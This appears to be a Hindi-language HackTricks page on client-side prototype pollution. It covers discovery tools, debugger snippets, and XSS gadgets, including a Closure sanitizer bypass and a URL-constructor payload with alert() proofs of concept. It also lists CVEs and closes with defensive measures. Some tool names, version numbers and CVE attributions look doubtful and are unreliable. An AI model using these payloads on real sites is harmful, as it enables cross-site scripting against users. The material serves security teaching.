# क्लाइंट साइड प्रोटोटाइप प्रदूषण

{{#include ../../../banners/hacktricks-training.md}}

## स्वचालित उपकरणों का उपयोग करके खोज करना

उपकरण [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **और** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) का उपयोग **प्रोटोटाइप प्रदूषण कमजोरियों** को **खोजने** के लिए किया जा सकता है।

इसके अलावा, आप **ब्राउज़र एक्सटेंशन** [**PPScan**](https://github.com/msrkp/PPScan) का उपयोग करके **स्वचालित रूप से** उन **पृष्ठों** को **स्कैन** कर सकते हैं जिन्हें आप **प्रोटोटाइप प्रदूषण कमजोरियों** के लिए **एक्सेस** करते हैं।

### यह पता लगाना कि एक प्रॉपर्टी कहां उपयोग की गई है <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Finding the root cause of Prototype Pollution <a href="#id-5530" id="id-5530"></a>

एक बार जब किसी प्रोटोटाइप प्रदूषण की भेद्यता को किसी भी उपकरण द्वारा पहचाना गया है, और यदि कोड अत्यधिक जटिल नहीं है, तो आप Chrome Developer Tools में `location.hash`, `decodeURIComponent`, या `location.search` जैसे कीवर्ड्स की खोज करके भेद्यता को ढूंढ सकते हैं। यह दृष्टिकोण आपको JavaScript कोड के संवेदनशील भाग को सटीक रूप से पहचानने की अनुमति देता है।

बड़े और अधिक जटिल कोडबेस के लिए, संवेदनशील कोड को खोजने के लिए एक सीधा तरीका निम्नलिखित चरणों में शामिल है:

1. एक उपकरण का उपयोग करें ताकि एक भेद्यता की पहचान की जा सके और एक पेलोड प्राप्त किया जा सके जो कंस्ट्रक्टर में एक प्रॉपर्टी सेट करने के लिए डिज़ाइन किया गया हो। ppmap द्वारा प्रदान किया गया एक उदाहरण इस प्रकार हो सकता है: `constructor[prototype][ppmap]=reserved`।
2. उस JavaScript कोड की पहली पंक्ति पर एक ब्रेकपॉइंट सेट करें जो पृष्ठ पर निष्पादित होगा। पृष्ठ को पेलोड के साथ रिफ्रेश करें, इस ब्रेकपॉइंट पर निष्पादन को रोकते हुए।
3. जबकि JavaScript निष्पादन रुका हुआ है, JS कंसोल में निम्नलिखित स्क्रिप्ट निष्पादित करें। यह स्क्रिप्ट संकेत देगी जब 'ppmap' प्रॉपर्टी बनाई जाती है, जिससे इसके मूल को खोजने में मदद मिलेगी:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. **Sources** टैब पर वापस जाएं और “Resume script execution” का चयन करें। JavaScript निष्पादन जारी रखेगा, और 'ppmap' प्रॉपर्टी अपेक्षित रूप से प्रदूषित हो जाएगी। प्रदान किए गए स्निपेट का उपयोग करके 'ppmap' प्रॉपर्टी के प्रदूषित होने के सटीक स्थान की पहचान करना आसान होता है। **Call Stack** की जांच करके, प्रदूषण होने वाले विभिन्न स्टैक्स को देखा जा सकता है।

किस स्टैक की जांच करनी है, यह तय करते समय, अक्सर JavaScript लाइब्रेरी फ़ाइलों से जुड़े स्टैक्स को लक्षित करना उपयोगी होता है, क्योंकि प्रोटोटाइप प्रदूषण अक्सर इन लाइब्रेरीज़ के भीतर होता है। लाइब्रेरी फ़ाइलों से इसके जुड़ाव की जांच करके प्रासंगिक स्टैक की पहचान करें (जो दाईं ओर दिखाई देता है, मार्गदर्शन के लिए प्रदान की गई छवि के समान)। कई स्टैक्स के मामलों में, जैसे कि पंक्तियों 4 और 6 पर, तार्किक विकल्प पंक्ति 4 का स्टैक है, क्योंकि यह प्रदूषण की प्रारंभिक घटना का प्रतिनिधित्व करता है और इस प्रकार भेद्यता का मूल कारण है। स्टैक पर क्लिक करने से आपको संवेदनशील कोड पर ले जाया जाएगा।

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## स्क्रिप्ट गैजेट्स खोजना

गैजेट वह **कोड है जिसका दुरुपयोग तब किया जाएगा जब PP भेद्यता का पता लगाया जाएगा**।

यदि एप्लिकेशन सरल है, तो हम **`srcdoc/innerHTML/iframe/createElement`** जैसे **कीवर्ड्स** के लिए **खोज** कर सकते हैं और स्रोत कोड की समीक्षा कर सकते हैं और जांच सकते हैं कि क्या यह **जावास्क्रिप्ट निष्पादन की ओर ले जाता है**। कभी-कभी, उल्लेखित तकनीकें गैजेट्स नहीं खोज पाती हैं। उस मामले में, शुद्ध स्रोत कोड समीक्षा कुछ अच्छे गैजेट्स का खुलासा करती है जैसे कि नीचे दिया गया उदाहरण।

### मिथिल लाइब्रेरी कोड में PP गैजेट खोजना

इस लेख को देखें: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## संवेदनशील लाइब्रेरी के लिए पेलोड्स का पुनः संकलन

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PP के माध्यम से HTML Sanitizers बायपास

[**यह शोध**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) PP गैजेट्स को दिखाता है जो **कुछ HTML sanitizers लाइब्रेरी द्वारा प्रदान की गई सैनीटाइजेशन को बायपास करने के लिए** उपयोग किए जा सकते हैं:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## New Tools & Automation (2023–2025)

* **Burp Suite DOM Invader (v2023.6)** – PortSwigger ने एक समर्पित *Prototype-pollution* टैब जोड़ा है जो स्वचालित रूप से पैरामीटर नामों को परिवर्तित करता है (जैसे `__proto__`, `constructor.prototype`) और ब्राउज़र एक्सटेंशन के अंदर सिंक पॉइंट्स पर प्रदूषित गुणों का पता लगाता है। जब एक गैजेट सक्रिय होता है, तो DOM Invader निष्पादन स्टैक और उस सटीक पंक्ति को दिखाता है जहां गुण को डिरेफरेंस किया गया था, जिससे मैनुअल ब्रेकपॉइंट शिकार की आवश्यकता नहीं होती। इसे ऊपर दिखाए गए "Break on property access" स्निपेट के साथ मिलाकर *source → sink* से जल्दी बदलें।
* **protoStalker** – एक ओपन-सोर्स Chrome DevTools प्लग-इन (जारी 2024) जो वास्तविक समय में प्रोटोटाइप श्रृंखलाओं को दृश्य बनाता है और `onerror`, `innerHTML`, `srcdoc`, `id` आदि जैसे वैश्विक रूप से खतरनाक कुंजियों पर लिखने को चिह्नित करता है। जब आपके पास केवल एक उत्पादन बंडल हो और आप निर्माण चरण को इंस्ट्रूमेंट नहीं कर सकते हैं, तो यह उपयोगी है।
* **ppfuzz 2.0 (2025)** – यह उपकरण अब ES-मॉड्यूल, HTTP/2 और WebSocket एंडपॉइंट्स का समर्थन करता है। नया `-A browser` मोड एक हेडलेस Chromium उदाहरण को चालू करता है और DOM APIs को ब्रूटफोर्स करके गैजेट वर्गों को स्वचालित रूप से सूचीबद्ध करता है (नीचे अनुभाग देखें)।

---

## Recent Prototype-Pollution Gadget Research (2022–2025)

2023 के मध्य में PortSwigger के शोधकर्ताओं ने एक पेपर प्रकाशित किया जिसमें दिखाया गया कि *browser-built-in* वस्तुओं को विश्वसनीय XSS गैजेट्स में परिवर्तित किया जा सकता है जब वे प्रदूषित होते हैं। क्योंकि ये वस्तुएं **हर** पृष्ठ पर मौजूद होती हैं, आप निष्पादन प्राप्त कर सकते हैं भले ही लक्षित एप्लिकेशन कोड प्रदूषित गुण को कभी न छुए।

Example gadget (works in all evergreen browsers ≥ 2023-04):
```html
<script>
// Source (e.g. https://victim/?__proto__[href]=javascript:alert(document.domain))
// For demo we just pollute manually:
Object.prototype.href = 'javascript:alert(`polluted`)' ;

// Sink – URL() constructor implicitly reads `href`
new URL('#'); // breaks into JS; in Chrome you get an alert, Firefox loads "javascript:" URL
</script>
```
अन्य उपयोगी वैश्विक गैजेट्स जो प्रदूषण के बाद काम करने की पुष्टि की गई है (परीक्षण 2024-11):

| गैजेट वर्ग | पढ़ें प्रॉपर्टी | प्राइमिटिव प्राप्त |
|--------------|---------------|--------------------|
| `Notification` | `title` | `alert()` नोटिफिकेशन क्लिक के माध्यम से |
| `Worker` | `name` | समर्पित वर्कर में JS निष्पादन |
| `Image` | `src` | पारंपरिक `onerror` XSS |
| `URLSearchParams` | `toString` | DOM-आधारित ओपन रीडायरेक्ट |

पूर्ण गैजेट्स की सूची और सैंडबॉक्स escapes पर चर्चा के लिए PortSwigger पेपर देखें।

---

## उल्लेखनीय क्लाइंट-साइड PP CVEs (2023-2025)

* **DOMPurify ≤ 3.0.8 – CVE-2024-45801**  एक हमलावर `Node.prototype.after` को प्रदूषित कर सकता था इससे पहले कि सेनिटाइज़र प्रारंभ हो, *SAFE_FOR_TEMPLATES* प्रोफ़ाइल को बायपास करते हुए और संग्रहीत XSS की ओर ले जाते हुए। विक्रेता ने आंतरिक मानचित्रों के लिए `Object.hasOwn()` जांच और `Object.create(null)` का उपयोग करके पैच किया।
* **jQuery 3.6.0-3.6.3 – CVE-2023-26136 / CVE-2023-26140**  `extend()` को `location.hash` से उत्पन्न कस्टम ऑब्जेक्ट्स पर उपयोग किया जा सकता था, जो ब्राउज़िंग संदर्भ में `Object.prototype` में मनमाने प्रॉपर्टीज़ को पेश करता था।
* **sanitize-html < 2.8.1 (2023-10) प्रोटोटाइप प्रदूषण**  एक दुर्भावनापूर्ण एट्रिब्यूट सूची जैसे `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` ने अनुमति-सूची को बायपास किया।

यहां तक कि यदि कमजोर पुस्तकालय **केवल क्लाइंट पर** है, तो परिणामी XSS अभी भी परावर्तित पैरामीटर, postMessage हैंडलर्स या बाद में प्रस्तुत संग्रहीत डेटा के माध्यम से दूर से शोषण योग्य है।

---

## आधुनिक रक्षात्मक उपाय

1. **वैश्विक प्रोटोटाइप को जल्दी फ्रीज़ करें** (आदर्श रूप से पहले स्क्रिप्ट के रूप में):
```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
```
ध्यान दें कि यह देर से विस्तार पर निर्भर करने वाले पॉलीफिल्स को तोड़ सकता है।
2. `JSON.parse(JSON.stringify(obj))` या समुदाय "deepMerge" स्निप्पेट्स के बजाय `structuredClone()` का उपयोग करें - यह सेटर्स/गेटर्स को नजरअंदाज करता है और प्रोटोटाइप श्रृंखला को नहीं चलाता है।
3. जब आपको वास्तव में गहरे मर्ज कार्यक्षमता की आवश्यकता हो, तो **lodash ≥ 4.17.22** या **deepmerge ≥ 5.3.0** चुनें जिसमें अंतर्निहित प्रोटोटाइप सैनिटेशन है।
4. `script-src 'self'` और एक सख्त नॉनस के साथ एक Content-Security-Policy जोड़ें। जबकि CSP सभी गैजेट्स को नहीं रोकेगा (जैसे `location` हेरफेर), यह `innerHTML` सिंक के अधिकांश को ब्लॉक करता है।

## संदर्भ

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [https://portswigger.net/research/widespread-prototype-pollution-gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/](https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/)

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
